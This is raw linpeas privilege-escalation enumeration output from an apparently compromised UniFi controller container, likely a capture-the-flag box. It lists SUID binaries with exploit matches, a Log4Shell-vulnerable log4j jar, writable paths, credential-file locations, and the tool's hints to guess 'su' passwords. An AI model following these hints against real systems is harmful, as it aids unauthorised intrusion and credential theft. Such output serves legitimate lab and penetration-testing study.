                                                                                                                                                             
╔══════════╣ Last Logons and Login History
                                                                                                                                                             
══╣ Last logins
                                                                                                                                                             
wtmp begins Sun Jan  2 06:17:54 2022

══╣ Failed login attempts
                                                                                                                                                             
══╣ Recent logins from auth.log (limit 20)
                                                                                                                                                             
══╣ Last time logon each user
Username         Port     From             Latest                                                                                                            

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                             
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                             


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                           
                             ╚══════════════════════╝                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                              
/usr/bin/curl
/usr/bin/perl

╔══════════╣ Installed Compilers
                                                                                                                                                             
╔══════════╣ Analyzing Mongo Files (limit 70)
Version: MongoDB shell version v3.6.3                                                                                                                        
git version: 9586e557d54ef70f9ca4b43c26892cd55257e1a5
OpenSSL version: OpenSSL 1.1.1  11 Sep 2018
allocator: tcmalloc
modules: none
build environment:
    distarch: x86_64
    target_arch: x86_64
db version v3.6.3
git version: 9586e557d54ef70f9ca4b43c26892cd55257e1a5
OpenSSL version: OpenSSL 1.1.1  11 Sep 2018
allocator: tcmalloc
modules: none
build environment:
    distarch: x86_64
    target_arch: x86_64
-rw-r--r-- 1 root root 2154 Mar 22  2019 /etc/mongodb.conf
dbpath=/var/lib/mongodb
logpath=/var/log/mongodb/mongodb.log
logappend=true
bind_ip = 127.0.0.1
journal=true

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 1 root root 4096 Jan  2  2022 /etc/pam.d                                                                                                          


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jan  2  2022 /usr/share/keyrings                                                                                                 




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                   
-rw-r--r-- 1 1000 1000 3771 Dec 30  2021 /home/michael/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 1000 1000 807 Dec 30  2021 /home/michael/.profile




╔══════════╣ Searching Log4Shell vulnerable libraries
/usr/lib/unifi/lib/log4j-core-2.13.3.jar                                                                                                                     



╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                 
gpg Not Found
netpgpkeys Not Found                                                                                                                                         
netpgp Not Found                                                                                                                                             
                                                                                                                                                             
-rw-r--r-- 1 root root 1188 Sep 20  2021 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                               
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):                                                                                                              
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                 
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
2113PSTORAGE_CERTSBIN





                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                           
                      ╚════════════════════════════════════╝                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
strace Not Found                                                                                                                                             
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd                                                                                                     
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall                                                                                                         
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                       
files with acls in searched folders Not Found                                                                                                                
                                                                                                                                                             
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                               
══╣ Current shell capabilities                                                                                                                               
CapInh:  [Invalid capability format]                                                                                                                         
CapPrm:  [Invalid capability format]
CapEff:  [Invalid capability format]
CapBnd:  [Invalid capability format]
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
CapInh:  [Invalid capability format]                                                                                                                         
CapPrm:  [Invalid capability format]
CapEff:  [Invalid capability format]
CapBnd:  [Invalid capability format]
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                       
/etc/ld.so.conf                                                                                                                                              
Content of /etc/ld.so.conf:                                                                                                                                  
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                
  - /usr/local/lib                                                                                                                                           
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                          
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                             
total 12                                                                                                                                                     
drwxr-xr-x 2 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root   96 Aug 13  2020 01-locale-fix.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                 
                                                                                                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                 
═╣ Credentials in fstab/mtab? ........... No                                                                                                                 
═╣ Can I read shadow files? ............. No                                                                                                                 
═╣ Can I read shadow plists? ............ No                                                                                                                 
═╣ Can I write shadow plists? ........... No                                                                                                                 
═╣ Can I read opasswd file? ............. No                                                                                                                 
═╣ Can I write in network-scripts? ...... No                                                                                                                 
═╣ Can I read root folder? .............. No                                                                                                                 
                                                                                                                                                             
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                       
/home/michael/user.txt
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                             
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                             
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                             
/dev/mqueue                                                                                                                                                  
/dev/shm
/run/lock
/run/unifi
/run/unifi/mongod.pid
/run/unifi/update.json
/run/unifi/work
/run/unifi/work/ROOT
/tmp
/tmp/.unifi-1636741257495200931
/tmp/hsperfdata_unifi
/tmp/hsperfdata_unifi/17
/tmp/ignore
/tmp/ignore/linpeas.sh
/tmp/ignore/linpeas.txt
/unifi
/unifi/data
/unifi/data/backup
/unifi/data/backup/6.4.54.unf
/unifi/data/backup/autobackup
/unifi/data/backup/meta.json
/unifi/data/db
/unifi/data/db/WiredTiger
/unifi/data/db/WiredTiger.lock
/unifi/data/db/WiredTiger.turtle
/unifi/data/db/WiredTiger.wt
/unifi/data/db/WiredTigerLAS.wt
#)You_can_write_even_more_files_inside_last_directory

/unifi/data/db/diagnostic.data/metrics.2021-12-30T21-37-32Z-00000
/unifi/data/db/diagnostic.data/metrics.2021-12-30T21-48-59Z-00000
/unifi/data/db/diagnostic.data/metrics.2021-12-30T21-58-34Z-00000
/unifi/data/db/diagnostic.data/metrics.2021-12-30T22-03-16Z-00000
/unifi/data/db/diagnostic.data/metrics.2021-12-31T00-01-43Z-00000
#)You_can_write_even_more_files_inside_last_directory

/unifi/data/db/index-1-4495969142330236937.wt
/unifi/data/db/index-10-4495969142330236937.wt
/unifi/data/db/index-100-4495969142330236937.wt
/unifi/data/db/index-102-4495969142330236937.wt
/unifi/data/db/index-103-4495969142330236937.wt
#)You_can_write_even_more_files_inside_last_directory

/unifi/data/db/journal/WiredTigerLog.0000000012
/unifi/data/db/journal/WiredTigerPreplog.0000000001
/unifi/data/db/journal/WiredTigerPreplog.0000000002
/unifi/data/db/mongod.lock
/unifi/data/db/sizeStorer.wt
/unifi/data/db/storage.bson
/unifi/data/db/version
/unifi/data/firmware.json
/unifi/data/keystore
/unifi/data/model_lifecycles.json
/unifi/data/system.properties
/unifi/data/system.properties.bk
/unifi/log
/unifi/log/mongod.log
/unifi/log/remote
/unifi/log/server.log
/usr/lib/unifi
/usr/lib/unifi/bin
/usr/lib/unifi/bin/ubnt-apttool
/usr/lib/unifi/bin/unifi.init
/usr/lib/unifi/dl
/usr/lib/unifi/dl/firmware
/usr/lib/unifi/dl/firmware/bundles.json
/usr/lib/unifi/lib
/usr/lib/unifi/lib/ace.jar
/usr/lib/unifi/lib/analytics-api-1.2.1.jar
/usr/lib/unifi/lib/analytics-client-1.2.1.jar
/usr/lib/unifi/lib/analytics-privacy-1.2.1.jar
/usr/lib/unifi/lib/animal-sniffer-annotations-1.17.jar
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/unifi/lib/native/Linux
/usr/lib/unifi/lib/native/Linux/aarch64
/usr/lib/unifi/lib/native/Linux/aarch64/libubnt_sdnotify_jni.so
/usr/lib/unifi/lib/native/Linux/aarch64/libubnt_webrtc_jni.so
/usr/lib/unifi/lib/native/Linux/armv7
/usr/lib/unifi/lib/native/Linux/armv7/libubnt_sdnotify_jni.so
/usr/lib/unifi/lib/native/Linux/armv7/libubnt_webrtc_jni.so
/usr/lib/unifi/lib/native/Linux/x86_64
/usr/lib/unifi/lib/native/Linux/x86_64/libubnt_sdnotify_jni.so
/usr/lib/unifi/lib/native/Linux/x86_64/libubnt_webrtc_jni.so
/usr/lib/unifi/lib/native/Mac
/usr/lib/unifi/lib/native/Mac/x86_64
/usr/lib/unifi/lib/native/Mac/x86_64/libubnt_webrtc_jni.dylib
/usr/lib/unifi/lib/native/Windows
/usr/lib/unifi/lib/native/Windows/x86_64
/usr/lib/unifi/lib/native/Windows/x86_64/ubnt_webrtc_jni.dll
/usr/lib/unifi/lib/openssh-1.0.jar
/usr/lib/unifi/lib/org.eclipse.paho.client.mqttv3-1.1.0.jar
/usr/lib/unifi/lib/owasp-java-html-sanitizer-20190503.1.jar
/usr/lib/unifi/lib/postgresql-42.2.8.jar
/usr/lib/unifi/lib/proto-google-common-protos-1.12.0.jar
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/unifi/webapps
/usr/lib/unifi/webapps/ROOT
/usr/lib/unifi/webapps/ROOT/WEB-INF
/usr/lib/unifi/webapps/ROOT/WEB-INF/resourcerewrite.xml
/usr/lib/unifi/webapps/ROOT/WEB-INF/urlrewrite.xml
/usr/lib/unifi/webapps/ROOT/WEB-INF/web.xml
/usr/lib/unifi/webapps/ROOT/app-unifi
/usr/lib/unifi/webapps/ROOT/app-unifi/.version
/usr/lib/unifi/webapps/ROOT/app-unifi/angular
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/css
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/css/app.css
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/css/app.css.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/css/styles.bundle.css
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/css/styles.bundle.css.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/data
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/data/defaults
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/data/defaults/dashboard-common-modules.json
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/data/defaults/dashboard-default-modules.json
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/data/eventKeys.json
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/FontAwesome.otf
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/FontAwesome.otf.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts.css
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts.css.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts/Lato-italic-100.woff
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts/Lato-italic-100.woff.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts/Lato-italic-300.woff
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts/Lato-italic-300.woff.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/aura/fonts/Lato-italic-400.woff
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/fontawesome-webfont.eot
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/fontawesome-webfont.eot.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/fontawesome-webfont.svg.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/fontawesome-webfont.ttf
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/fontawesome-webfont.ttf.br
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts/ubnt.eot
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts/ubnt.eot.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts/ubnt.svg.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts/ubnt.ttf
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/fonts/ubnt.ttf.br
#)You_can_write_even_more_files_inside_last_directory

/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/style.css
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/fonts/ubnt-icon/style.css.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/badges
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/badges/app-store-badge.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/badges/google-play-badge.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidPhone/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidTablet/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/androidWatch/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleDesktop/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/applePhone
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/applePhone/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/applePhone/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/applePhone/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/applePhone/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleTablet
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleTablet/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleTablet/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleTablet/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleTablet/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch/standard@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/appleWatch/standard@4x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/linuxDesktop
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/linuxDesktop/grid.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/linuxDesktop/grid@2x.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/linuxDesktop/standard.png.br
/usr/lib/unifi/webapps/ROOT/app-unifi/angular/g9c8f4ab88/images/clients/photos/dpi/linuxDesktop/standard@2x.png.br

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                             
                                                                                                                                                             


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                          
                            ╚═════════════════════════╝                                                                                                      
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                     
/usr/local/bin/docker-healthcheck.sh                                                                                                                         
/usr/local/bin/docker-entrypoint.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-08-23+21:58:00.6340961980 /tmp/ignore/linpeas.sh                                                                                                        
2025-08-23+20:46:38.6579666850 /.dockerenv

╔══════════╣ Unexpected in root
/.dockerenv                                                                                                                                                  
/unifi

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/hsperfdata_unifi/17                                                                                                                                     
/unifi/data/db/journal/WiredTigerLog.0000000012
/unifi/data/db/diagnostic.data/metrics.2025-08-23T19-46-46Z-00000
/unifi/data/db/diagnostic.data/metrics.interim

╔══════════╣ Syslog configuration (limit 50)
syslog configuration Not Found                                                                                                                               
╔══════════╣ Auditd configuration (limit 50)                                                                                                                 
auditd configuration Not Found                                                                                                                               
╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                
    36305     48 -rw-r-----   1 root     adm         45136 Sep 20  2021 /var/log/apt/term.log                                                                

╔══════════╣ Files inside /home/unifi (limit 20)
                                                                                                                                                             
╔══════════╣ Files inside others home (limit 20)
/home/michael/.bash_logout                                                                                                                                   
/home/michael/.bashrc
/home/michael/.profile
/home/michael/user.txt

╔══════════╣ Searching installed mail applications
                                                                                                                                                             
╔══════════╣ Mails (limit 50)
                                                                                                                                                             
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Jan  2  2022 /var/backups                                                                                                        
total 0


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 unifi unifi 1339 Aug 23 20:46 /unifi/data/system.properties.bk                                                                                  


╔══════════╣ Web files?(output limit)
                                                                                                                                                             
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 unifi unifi 19 Sep 14  2021 /usr/lib/unifi/webapps/ROOT/app-unifi/.version                                                                      
-rw-r--r-- 1 root root 2764 Apr 21  2021 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo
-rw-r--r-- 1 1000 1000 220 Dec 30  2021 /home/michael/.bash_logout
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug 27  2021 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Sep 20  2021 /etc/.java/.systemPrefs/.system.lock
-rw-r--r-- 1 root root 0 Sep 20  2021 /etc/.java/.systemPrefs/.systemRootModFile

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw------- 1 unifi unifi 32768 Aug 23 21:59 /tmp/hsperfdata_unifi/17                                                                                         
-rwxr-xr-x 1 unifi unifi 954437 Aug 23 21:58 /tmp/ignore/linpeas.sh
-rw-r--r-- 1 unifi unifi 139382 Aug 23 22:00 /tmp/ignore/linpeas.txt

╔══════════╣ Searching passwords in history files
                                                                                                                                                             
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/java-8-openjdk/management/jmxremote.password                                                                                                            
/etc/pam.d/common-password
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/lib/unifi/lib/google-auth-library-credentials-0.11.0.jar
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                             
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                             
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                                                                      
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
